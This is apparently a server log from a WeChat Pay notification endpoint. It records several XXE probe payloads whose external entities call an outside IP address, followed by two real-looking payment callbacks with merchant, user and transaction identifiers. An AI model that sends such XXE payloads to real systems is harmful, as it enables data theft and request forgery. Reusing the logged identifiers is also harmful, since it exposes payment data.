03:14:02|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070703_840?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:14:02|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070703_840?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:22:35|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070703_840?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:22:35|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070703_840?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:28:48|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070703_840?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:28:48|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070703_840?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
16:24:46|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[BOC_DEBIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d21ac3f9934b]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[256061583186570103201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[C068612664A5707979F4BFA2E50B8D19]]></sign>
<time_end><![CDATA[20190707162445]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000352201907074312423206]]></transaction_id>
</xml>'
| GET:array (
)
16:24:46|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'BOC_DEBIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d21ac3f9934b',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '256061583186570103201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'C068612664A5707979F4BFA2E50B8D19',
  'time_end' => '20190707162445',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000352201907074312423206',
)
| GET:array (
)
18:10:10|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[BOC_DEBIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d21c4f59de24]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[223061583819614703201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[08103B94BE7707463FA1CD5F5D056224]]></sign>
<time_end><![CDATA[20190707181009]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000344201907079955468609]]></transaction_id>
</xml>'
| GET:array (
)
18:10:10|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'BOC_DEBIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d21c4f59de24',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '223061583819614703201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '08103B94BE7707463FA1CD5F5D056224',
  'time_end' => '20190707181009',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000344201907079955468609',
)
| GET:array (
)
